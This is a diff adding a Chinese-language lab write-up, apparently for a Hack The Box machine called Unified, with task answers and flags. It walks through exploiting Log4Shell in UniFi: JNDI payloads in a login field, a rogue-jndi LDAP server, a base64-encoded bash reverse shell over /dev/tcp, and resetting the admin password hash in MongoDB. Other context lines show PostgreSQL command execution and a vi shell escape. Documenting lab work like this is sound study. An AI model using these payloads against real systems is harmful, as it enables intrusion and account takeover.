@@ -489,6 +489,7 @@ select version(): 'PostgreSQL 11.7 (Ubuntu 11.7-0ubuntu0.19.10.1) on x86_64-pc-l
 目标是 **PostgreSQL**，而 PostgreSQL 有一个著名的命令执行方式：`COPY (SELECT '') TO PROGRAM 'whoami'`，这个功能需要**超级用户权限**，但很多管理员为了方便，直接用 `postgres` 超级用户运行数据库服务。
 
 而**sqlmap 的 `--os-shell` 底层就是封装了这个过程**：
+
 ```
 1. 创建一张临时表  
 2. 用 `COPY ... FROM PROGRAM` 执行系统命令  
@@ -615,7 +616,7 @@ postgres@vaccine:~$ sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
 
 ```
 
-**注意**：需要在 `vi` 的**命令模式**下输入`:!/bin/bash`之后回车，这个命令的意思是：**暂停 `vi` 编辑器，并启动一个 `/bin/bash` Shell**，如果返回后看到的是root@xxx即为提权成功，至此成功拿下root的flag
+**注意**：需要在 `vi` 的**命令模式**下输入`:!/bin/bash`之后回车，这个命令的意思是：**暂停 `vi` 编辑器，并启动一个 `/bin/bash` Shell**，如果返回后看到的是root@xxx即提权成功，至此成功拿下root的flag
 
 ```
 
@@ -1165,6 +1166,7 @@ answer：xp_cmdshell
 ## Task 6/7
 
 Task 6 Q：What script can be used in order to search possible paths to escalate privileges on Windows hosts?
+
 Task 7 Q：What file contains the administrator's password?
 
 为了这个交互方式，获取一个完整的命令行窗口，准备使用Web下载+执行的方式，反弹一个shell给我的kali
@@ -1306,10 +1308,346 @@ b91ccec3305e98240082d4474b848528
 sql_svc answer：3e7b102e78218e935bf3f4951fec21a3
 administrator answer：b91ccec3305e98240082d4474b848528
 
+# 靶场：Unified(Linux)
 
+## Task 1/2
 
+Task 1 Q：Which are the first four open ports?
 
+Task 2 Q：What is the title of the software that is running running on port 8443?
 
+依旧先扫端口
 
+```
+PORT     STATE SERVICE         VERSION
+22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
+|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
+|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
+6789/tcp open  ibm-db2-admin?
+8080/tcp open  http            Apache Tomcat (language: en)
+|_http-title: Did not follow redirect to https://10.129.49.244:8443/manage
+|_http-open-proxy: Proxy might be redirecting requests
+8443/tcp open  ssl/nagios-nsca Nagios NSCA
+| http-title: UniFi Network
+|_Requested resource was /manage/account/login?redirect=%2Fmanage
+| ssl-cert: Subject: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US
+| Subject Alternative Name: DNS:UniFi
+| Not valid before: 2021-12-30T21:37:24
+|_Not valid after:  2024-04-03T21:37:24
+|_ssl-date: TLS randomness does not represent time
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
+```
 
+Task 1 answer：22,6789,8080,8443
+
+Task 2 answer：UniFi Network
+## Task 3
+
+What is the version of the software that is running?
+
+进行访问8080端口时，它会自动跳转到8443端口的登录页：`https://10.129.49.244:8443/manage/account/login?redirect=%2Fmanage%2F`，界面中显示UniFi的版本为`6.4.54`
+
+answer：6.4.54
+
+## Task 4
+
+What is the CVE for the identified vulnerability?
+
+自行Google搜索，项目+版本号的相关CVE
+
+搜到的结果是 Ubiquiti UniFi 网络 Log4Shell 直接检查 (CVE-2021-44228)
+
+捆绑 Apache Log4j 日志记录库的 Ubiquiti UniFi Network 中存在一个远程代码执行漏洞。  
+Apache Log4j 中存在漏洞，原因是处理用户控制的输入时对消息查找替换的保护不足。未经身份验证的远程攻击者可以利用此漏洞，通过 Web 请求以运行 Java 进程的权限级别执行任意代码。
+
+**Java方面的一些知识**：
+
+LDAP(Lightweight Directory Access Protocol):轻量级目录访问协议，是一个为查询、浏览和搜索而优化的数据库，具有树状结构，像文件目录一样，用于查询，具有优异的读性能。
+
+JNDI(Java Naming and Directory Interface)：Java命名和目录接口(命名服务接口)
+
+**命名服务**：用于根据名字找到位置、服务、信息、资源、对象等信息
+
+**基本操作**：
+1. 发布服务(名字和资源的映射)
+2. 用名字查找资源
+
+JDBC连接数据库需要提供驱动、数据库名、帐号、密码、ip、端口等信息，但JNDI连接数据库只需要提供名字，其他信息已经被封装在配置中，JNDI出现简化了访问资源
+
+answer：CVE-2021-44228
+
+## Task 5
+
+进行抓包发现，数据包为`{"username":"admin","password":"111","remember":false,"strict":true}`
+
+Log4j漏洞是在**日志记录阶段**触发的，而不是在业务逻辑处理阶段，尝试数据外带
+
+```
+{"username":"admin","password":"111","remember":"${jndi:ldap://88nb4b.dnslog.cn/exploit}","strict":true}
+
+```
+
+返回结果，`"api.err.InvalidPayload"`表示服务器成功解析了请求，但在**业务逻辑层**校验时发现了异常，如果没有Log4j就不会解析`${}`语法
+
+|               返回信息               |                  解释                  |
+| :------------------------------: | :----------------------------------: |
+|          `"rc":"error"`          |             服务器明确返回了错误状态             |
+| `"msg":"api.err.InvalidPayload"` | 请求体格式异常，而非认证失败（`InvalidCredentials`） |
+
+```
+{"meta":{"rc":"error","msg":"api.err.InvalidPayload"},"data":[]}
+
+```
+
+answer：LDAP
+
+## Task 6/7
+
+Task 6 Q：What tool do we use to intercept the traffic, indicating the attack was successful?
+
+Task 7 Q：What port do we need to inspect intercepted traffic for?
+
+**后续攻击流程**：
+1. Linux中能够捕捉监听的工具：tcpdump
+2. 通过rogue-jndi开启本地LDAP服务（依赖Java和maven环境）
+3. 监听jndi注入的命令所使用的反弹shell端口
+4. 实施jndi攻击
+
+tcpdump工具介绍
+
+用简单的话来定义tcpdump，就是：dump the traffic on a network，根据使用者的定义对网络上的数据包进行截获的包分析工具。
+
+tcpdump可以将网络中传送的数据包的“头”完全截获下来提供分析。它支持针对网络层、协议、主机、网络或端口的过滤，并提供and、or、not等逻辑语句来帮助你去掉无用的信息。
+
+tcpdump基于底层libpcap库开发，运行需要root权限。
+
+**参数**：
+
+|  参数  |                           含义                            |
+| :--: | :-----------------------------------------------------: |
+|  -a  |                     将网络地址和广播地址转变成名字                     |
+|  -c  |                在收到指定的包的数目后，tcpdump就会停止；                 |
+|  -d  |           将匹配信息包的代码以人们能够理解的汇编格式给出；以可阅读的格式输出。            |
+| -dd  |                 将匹配信息包的代码以c语言程序段的格式给出；                  |
+| -ddd |                   将匹配信息包的代码以十进制的形式给出；                   |
+|  -e  |                   在输出行打印出数据链路层的头部信息；                    |
+|  -f  |                将外部的Internet地址以数字的形式打印出来；                |
+|  -l  |                      使标准输出变为缓冲行形式；                      |
+|  -n  |                     直接显示IP地址，不显示名称；                     |
+| -nn  |                   端口名称显示为数字形式，不显示名称；                    |
+|  -t  |                     在输出的每一行不打印时间戳；                      |
+|  -v  |           输出一个稍微详细的信息，例如在ip包中可以包括ttl和服务类型的信息；           |
+| -vv  |                       输出详细的报文信息；                        |
+|  -F  |                 从指定的文件中读取表达式,忽略其它的表达式；                  |
+|  -i  |                       指定监听的网络接口；                        |
+|  -r  |               从指定的文件中读取包(这些包一般通过-w选项产生)；                |
+|  -w  |                  直接将包写入文件中，并不分析和打印出来；                   |
+|  -T  | 将监听到的包直接解释为指定的类型的报文，常见的类型有rpc （远程过程调用）和snmp（简单 网络管理协议；） |
+
+因为Log4j漏洞的利用链，它的核心是JNDI注入，JNDI最常用的协议就是LDAP，**硬性要求**攻击者必须提供一个**LDAP服务**来接收查询。而**389端口是LDAP协议的默认端口**
+
+Task 6 answer：tcpdump
+
+Task 7 answer：389
+
+## Task 9-13
+
+Task 9 Q：What port is the MongoDB service running on?
+
+Task 10 Q：What is the default database name for UniFi applications?
+
+Task 11 Q：What is the function we use to enumerate users within the database in MongoDB?
+
+Task 12 Q：What is the function we use to update users within the database in MongoDB?
+
+Task 13 Q：What is the password for the root user?
+
+再次抓包，这次将payload中的ip替换为攻击机，同时攻击机监听389端口
+
+```
+{"username":"admin","password":"111","remember":"${jndi:ldap://10.10.17.123/aaa}","strict":true}
+
+┌──(kali㉿kali)-[~/Desktop]
+└─$ sudo tcpdump -i tun0 port 389
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+
+```
+
+攻击机的389端口收到了10.129.49.244从34170端口发出的数据，证明确实存在log4j漏洞
+
+```
+23:14:32.500814 IP 10.129.49.244.34170 > 10.10.17.123.ldap: Flags [S], seq 1440094507, win 64240, options [mss 1346,sackOK,TS val 2346656569 ecr 0,nop,wscale 7], length 0
+23:14:32.500894 IP 10.10.17.123.ldap > 10.129.49.244.34170: Flags [R.], seq 0, ack 1440094508, win 0, length 0
+
+```
+
+因为kali自带了Java环境，所以现在安装maven环境，同时下载我们接下来所需要的rogue-jndi，用于 JNDI 注入攻击的恶意 LDAP 服务器 
+
+`rogue-jndi`会像之前你手动监听389端口一样，收到这个请求。但它的厉害之处在于，它不仅会“听”，还会**根据你预先设定的命令，返回一个恶意的Java类，诱使靶场下载并执行，从而实现远程代码执行（RCE）**
+
+**注意**：下载完之后，需要在目录下进行编译，编译完成后会在该目录下会生成target文件夹，target文件夹中存在RogueJndi-1.1.jar，拥有该jar包后可以构建payload
+
+```
+sudo apt install maven -y
+
+git clone https://github.com/veracode-research/rogue-jndi
+
+mvn package
+
+```
+
+接下来就是反向shell，且为了防止传输中的编码出现问题，先进行base64编码
+
+```
+┌──(kali㉿kali)-[~/Desktop/rogue-jndi/rogue-jndi/target]
+└─$ echo bash -c 'bash -i >&/dev/tcp/10.10.17.123/4444 0>&1' | base64
+YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTcuMTIzLzQ0NDQgMD4mMQo=
+
+```
+
+之后可以构建命令，命令中`echo`之后的Base64编码字符串替换为自己生成的字符串。将主机名变量替换为攻击机ip
+
+```
+┌──(kali㉿kali)-[~/Desktop/rogue-jndi/rogue-jndi/target]
+└─$ java -jar RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTcuMTIzLzQ0NDQgMD4mMQo=}|{base64,-d}|{bash,-i}" --hostname "10.10.17.123"
++-+-+-+-+-+-+-+-+-+
+|R|o|g|u|e|J|n|d|i|
++-+-+-+-+-+-+-+-+-+
+Starting HTTP server on 0.0.0.0:8000
+Starting LDAP server on 0.0.0.0:1389
+Mapping ldap://10.10.17.123:1389/o=tomcat to artsploit.controllers.Tomcat
+Mapping ldap://10.10.17.123:1389/o=groovy to artsploit.controllers.Groovy
+Mapping ldap://10.10.17.123:1389/o=websphere1 to artsploit.controllers.WebSphere1
+Mapping ldap://10.10.17.123:1389/o=websphere1,wsdl=* to artsploit.controllers.WebSphere1
+Mapping ldap://10.10.17.123:1389/o=websphere2 to artsploit.controllers.WebSphere2
+Mapping ldap://10.10.17.123:1389/o=websphere2,jar=* to artsploit.controllers.WebSphere2
+Mapping ldap://10.10.17.123:1389/ to artsploit.controllers.RemoteReference
+Mapping ldap://10.10.17.123:1389/o=reference to artsploit.controllers.RemoteReference
+
+```
+
+复制payload，重新抓包，并且开始监听4444端口，拿到shell
+
+```
+{"username":"admin","password":"111","remember":"${jndi:ldap://10.10.17.123:1389/o=tomcat}","strict":true}
+
+// 已经成功收到了靶机的LDAP请求，并且已经发送了恶意类的引用（ResourceRef）回去
+Sending LDAP ResourceRef result for o=tomcat with javax.el.ELProcessor payload
+
+┌──(kali㉿kali)-[~/Desktop]
+└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.17.123] from (UNKNOWN) [10.129.49.244] 45412
+
+```
+
+需要了解unifi的数据库以及它的默认数据库名字是什么，于是直接Google搜索：unifi default database and whats the default database name，出现了UniFi's default database engine is `MongoDB`, and its default database name is `ace`
+
+现在就需要查找数据库相关的信息，发现端口号是27117
+
+```
+ps aux | grep mongo
+unifi         67  0.2  4.2 1100676 85672 ?       Sl   03:04   0:18 bin/mongod --dbpath /usr/lib/unifi/data/db --port 27117 --unixSocketPrefix /usr/lib/unifi/run --logRotate reopen --logappend --logpath /usr/lib/unifi/logs/mongod.log --pidfilepath /usr/lib/unifi/run/mongod.pid --bind_ip 127.0.0.1
+unifi       3286  0.0  0.0  11468  1068 ?        S    05:01   0:00 grep mongo
+
+```
+
+通过mongo命令尝试提取管理员密码来与MongoDB服务进行交互，拿到关键信息
+
+**解释**：
+1. `db.admin.find()`：查询admin表下的所有数据，即查询所有用户
+2. `forEach()`：遍历
+3. `printjson`：json格式打印
+
+```
+mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
+MongoDB shell version v3.6.3
+connecting to: mongodb://127.0.0.1:27117/ace
+MongoDB server version: 3.6.3
+{
+        "_id" : ObjectId("61ce278f46e0fb0012d47ee4"),
+        "name" : "administrator",
+        "email" : "administrator@unified.htb",
+        "x_shadow" : "$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.",
+
+```
+
+看到密码是`$6`开头的，于是搜索了一下是SHA512算法加密，如果是`$5`那就是SHA256加密，也可以通过hashid这个工具进行分辨
+
+```
+┌──(kali㉿kali)-[~]
+└─$ hashid '$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.'
+Analyzing '$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.'
+[+] SHA-512 Crypt 
+
+```
+
+> 现在两种办法，第一个就是常规碰撞，但是要求你的字典够大够硬，时间还要足，还有运气。
+> 
+> 但是，这里的这里密码哈希位于 x_shadow 变量中，但在这种情况下，密码破解程序无法破解。
+> 
+> 所以我们只能采用第二种办法，我们创建的哈希更改 x_shadow 密码哈希，以替换管理员密码并通过管理面板进行身份验证。
+> 
+> 所以我们要先生成一个sha-512的hash,这里使用mkpasswd工具。
+
+```
+┌──(kali㉿kali)-[~]
+└─$ mkpasswd -m sha-512 111111
+$6$viyBO50Atvqpokkc$NyZlC1Uuqe5yp4HqsYSycrW5z2uQSL2MmJlwCkEBk1KKFxWWqhH7LSDfgMoyqmo6YUI5Pcdgz8C7lPfzfpXZn.
+
+```
+
+继续用mongo进行替换目标的管理员密码，发现匹配为1，修改为1
+
+```
+mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$viyBO50Atvqpokkc$NyZlC1Uuqe5yp4HqsYSycrW5z2uQSL2MmJlwCkEBk1KKFxWWqhH7LSDfgMoyqmo6YUI5Pcdgz8C7lPfzfpXZn."}})'
+MongoDB shell version v3.6.3
+connecting to: mongodb://127.0.0.1:27117/ace
+MongoDB server version: 3.6.3
+WriteResult({ "nMatched" : 1, "nUpserted" : 0, "nModified" : 1 })
+
+```
+
+现在管理员的密码就是我们所更改的`111111`，去站点登录验证，成功后在设置中找到管理员账户的SSH凭证
+
+```
+root
+NotACrackablePassword4U2022
+
+```
+
+接下来就是ssh一下
+
+```
+┌──(kali㉿kali)-[~]
+└─$ ssh root@10.129.49.244
+
+// 输入密码后
+root@unified:~# ls
+root.txt
+root@unified:~# cat root.txt 
+e50bc93c75b634e4b272d2f771c33681
+
+// 后来发现还有个用户的flag
+root@unified:~# cat /home/michael/user.txt 
+6ced1a6a89e666c0620cdb10262ba127
+
+```
+
+Michiael answer：6ced1a6a89e666c0620cdb10262ba127
+
+Task 9 answer：27117
+
+Task 10 answer：ace
+
+Task 11 answer：db.admin.find()
+
+Task 12 answer：db.admin.update()
+
+Task 13 answer：NotACrackablePassword4U2022
+
+Root answer：e50bc93c75b634e4b272d2f771c33681
